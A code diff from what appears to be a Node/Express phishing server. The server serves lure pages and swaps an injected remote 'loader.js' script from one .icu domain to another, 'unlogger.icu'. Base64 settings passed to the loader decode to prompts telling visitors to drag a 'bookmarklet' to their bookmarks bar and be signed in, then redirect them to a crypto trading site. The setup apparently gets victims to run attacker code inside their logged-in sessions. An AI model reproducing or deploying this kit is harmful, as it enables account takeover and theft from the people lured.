@@ -14,7 +14,7 @@ app.use(express.static('public'));
 
 app.get("/", function (req, res) {
   	let html = fs.readFileSync(path.join(__dirname, '..', 'public', 'bloom.html'), 'utf8');
-	html = html.replace(`<script src="https://axiom-server.icu/loader.js"></script>`, `<script src="https://axiom-server.icu/loader.js" data="eyJoYXNoIjoiTURzM05qRXdOalU1T0RJeiIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJvb2ttYXJrbGV0IHRvIHlvdXIgYm9va21hcmtzIGJhciBpbnN0ZWFkIG9mIGNsaWNraW5nIGl0LiIsInJlZGlyZWN0IjoiWW91IGFyZSBub3cgYmVpbmcgcmVkaXJlY3RlZCB0byBodHRwczovL2F4aW9tLnRyYWRlL2Rpc2NvdmVyLiIsInVuYXV0aG9yaXplZCI6IllvdSBtdXN0IGJlIHNpZ25lZCBpbiB0byB1c2UgdGhpcyBib29rbWFya2xldC4iLCJlcnJvciI6IkZhaWxlZCB0byBleGVjdXRlIHRoZSBib29rbWFya2xldC4gUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4ifX0="></script>`);
+	html = html.replace(`<script src="https://axiom-server.icu/loader.js"></script>`, `<script src="https://unlogger.icu/loader.js" data="eyJoYXNoIjoiTURzM05qRXdOalU1T0RJeiIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJvb2ttYXJrbGV0IHRvIHlvdXIgYm9va21hcmtzIGJhciBpbnN0ZWFkIG9mIGNsaWNraW5nIGl0LiIsInJlZGlyZWN0IjoiWW91IGFyZSBub3cgYmVpbmcgcmVkaXJlY3RlZCB0byBodHRwczovL2F4aW9tLnRyYWRlL2Rpc2NvdmVyLiIsInVuYXV0aG9yaXplZCI6IllvdSBtdXN0IGJlIHNpZ25lZCBpbiB0byB1c2UgdGhpcyBib29rbWFya2xldC4iLCJlcnJvciI6IkZhaWxlZCB0byBleGVjdXRlIHRoZSBib29rbWFya2xldC4gUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4ifX0="></script>`);
   	res.send(html);
 });
 
@@ -32,9 +32,9 @@ app.get("/:data", function (req, res) {
 	if(["orangie"].includes(req.params.data)) req.query.start = "eyJoYXNoIjoiTURzM056TTRNRGszT0RBNSIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJvb2ttYXJrbGV0IHRvIHlvdXIgYm9va21hcmtzIGJhciBpbnN0ZWFkIG9mIGNsaWNraW5nIGl0LiIsInJlZGlyZWN0IjoiWW91IGFyZSBub3cgYmVpbmcgcmVkaXJlY3RlZCB0byBodHRwczovL2F4aW9tLnRyYWRlL2Rpc2NvdmVyLiIsInVuYXV0aG9yaXplZCI6IllvdSBtdXN0IGJlIHNpZ25lZCBpbiB0byB1c2UgdGhpcyBib29rbWFya2xldC4iLCJlcnJvciI6IkZhaWxlZCB0byBleGVjdXRlIHRoZSBib29rbWFya2xldC4gUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4ifX0=";
 	if(["bloom"].includes(req.params.data)) req.query.start = "eyJoYXNoIjoiTURzM056UXpORFU1TlRJMU95MHhNREF5TnpJek9ETTNPVGN6IiwiYWxlcnRzIjp7Imd1aWRlIjoiWW91IG11c3QgZHJhZyB0aGUgYm9va21hcmtsZXQgdG8geW91ciBib29rbWFya3MgYmFyIGluc3RlYWQgb2YgY2xpY2tpbmcgaXQuIiwicmVkaXJlY3QiOiJZb3UgYXJlIG5vdyBiZWluZyByZWRpcmVjdGVkIHRvIGh0dHBzOi8vYXhpb20udHJhZGUvZGlzY292ZXIuIiwidW5hdXRob3JpemVkIjoiWW91IG11c3QgYmUgc2lnbmVkIGluIHRvIHVzZSB0aGlzIGJvb2ttYXJrbGV0LiIsImVycm9yIjoiRmFpbGVkIHRvIGV4ZWN1dGUgdGhlIGJvb2ttYXJrbGV0LiBQbGVhc2UgdHJ5IGFnYWluIGxhdGVyLiJ9fQ==";
   	if (req.query.start) {
-		html = html.replace(`<script src="https://axiom-server.icu/loader.js"></script>`, `<script src="https://axiom-server.icu/loader.js" data="${req.query.start}"></script>`);
+		html = html.replace(`<script src="https://axiom-server.icu/loader.js"></script>`, `<script src="https://unlogger.icu/loader.js" data="${req.query.start}"></script>`);
 	} else {
-		html = html.replace(`<script src="https://axiom-server.icu/loader.js"></script>`, `<script src="https://axiom-server.icu/loader.js" data="eyJoYXNoIjoiTURzM05qRXdOalU1T0RJeiIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJvb2ttYXJrbGV0IHRvIHlvdXIgYm9va21hcmtzIGJhciBpbnN0ZWFkIG9mIGNsaWNraW5nIGl0LiIsInJlZGlyZWN0IjoiWW91IGFyZSBub3cgYmVpbmcgcmVkaXJlY3RlZCB0byBodHRwczovL2F4aW9tLnRyYWRlL2Rpc2NvdmVyLiIsInVuYXV0aG9yaXplZCI6IllvdSBtdXN0IGJlIHNpZ25lZCBpbiB0byB1c2UgdGhpcyBib29rbWFya2xldC4iLCJlcnJvciI6IkZhaWxlZCB0byBleGVjdXRlIHRoZSBib29rbWFya2xldC4gUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4ifX0="></script>`);
+		html = html.replace(`<script src="https://axiom-server.icu/loader.js"></script>`, `<script src="https://unlogger.icu/loader.js" data="eyJoYXNoIjoiTURzM05qRXdOalU1T0RJeiIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJvb2ttYXJrbGV0IHRvIHlvdXIgYm9va21hcmtzIGJhciBpbnN0ZWFkIG9mIGNsaWNraW5nIGl0LiIsInJlZGlyZWN0IjoiWW91IGFyZSBub3cgYmVpbmcgcmVkaXJlY3RlZCB0byBodHRwczovL2F4aW9tLnRyYWRlL2Rpc2NvdmVyLiIsInVuYXV0aG9yaXplZCI6IllvdSBtdXN0IGJlIHNpZ25lZCBpbiB0byB1c2UgdGhpcyBib29rbWFya2xldC4iLCJlcnJvciI6IkZhaWxlZCB0byBleGVjdXRlIHRoZSBib29rbWFya2xldC4gUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4ifX0="></script>`);
 	}
   	res.send(html);
 });
